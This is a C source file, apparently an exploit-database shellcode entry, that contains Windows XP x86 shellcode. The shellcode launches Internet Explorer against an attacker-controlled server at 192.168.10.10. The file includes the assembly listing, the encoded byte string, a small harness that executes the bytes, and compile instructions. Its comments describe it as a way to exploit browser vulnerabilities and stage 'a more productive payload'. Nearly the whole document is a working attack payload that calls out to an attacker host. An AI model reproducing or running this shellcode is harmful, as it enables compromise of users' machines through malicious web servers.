/*
# Title: start iexplore.exe
# Author: Joseph McDonagh
# Shellcode length 191
# Could be smaller if the app your are exploiting loads msvcrt.
# Purpose: Use the start command to open internet explorer and connect to a malicious web server
# The command this runs is simply start iexplore.exe http://192.168.10.10/ (Attacker controlled server), which can lead to a more productive payload.
# This code can exploit browser vulnerabilities without (or with) social engineering.
# Tested on: WinXP SP 2
# Thanks to Kartik Durg and sharing the shellcode entry 46281 and sharing the details on the iamroot blog https://iamroot.blog/2019/01/28/windows-shellcode-download-and-execute-payload-using-msiexec/.  This got me going in the right direction. And to POB. Using "start" is helpful for this type of payload.
# Complile on Kali #i686-w64-mingw32-gcc sie.c -o sie.exe
#

***** Assembly code follows *****

; The portion loads msvcrt to make the syscall.
; Hardcoded for winxp

xor eax, eax
mov ax, 0x7472
push eax
push dword 0x6376736d
push esp

; LoadLibrary (hardcoded for Windows XP.
; Can find this on a debugger or arwin)
mov ebx, 0x7c801d77
call ebx
mov ebp, eax

xor eax, eax
PUSH eax                ; null terminator
push 0x2f30312e	; /10.
push 0x30312e38	; 01.8
push 0x36312e32	; 61.2
push 0x39312f2f	; 91//
push 0x3a707474	; :ptt
push 0x68206578	; h ex
push 0x652e6572	; e.er
push 0x6f6c7078	; olpx
push 0x65692074	; ei t
push 0x72617473	; rats

; Below code moves the pointer and executes the system call that runs the command.

mov edi,esp
push edi
mov eax, 0x77c293c7
call eax

xor eax, eax
push eax
mov eax, 0x7c81caa2
call eax
*/

char code[]=

"\x31\xc0\x66\xb8\x72\x74\x50\x68\x6d\x73\x76\x63\x54\xbb\x77\x1d\x80\x7c\xff\xd3\x89\xc5\x31\xc0\x50\x68\x2e\x31\x30\x2f\x68\x38\x2e\x32\x36\x68\x32\x2e\x31\x36\x68\x2f\x2f\x31\x39\x68\x74\x74\x70\x3a\x68\x78\x65\x20\x68\x68\x72\x65\x2e\x65\x68\x78\x70\x6c\x6f\x68\x74\x20\x69\x65\x68\x73\x74\x61\x72\x89\xe7\x57\xb8\xc7\x93\xc2\x77\xff\xd0\x31\xc0\x50\xb8\xa2\xca\x81\x7c\xff\xd0";

int main(int argc, char **argv)
 {
int (*func)();
func = (int (*)()) code;
(int)(*func)();
}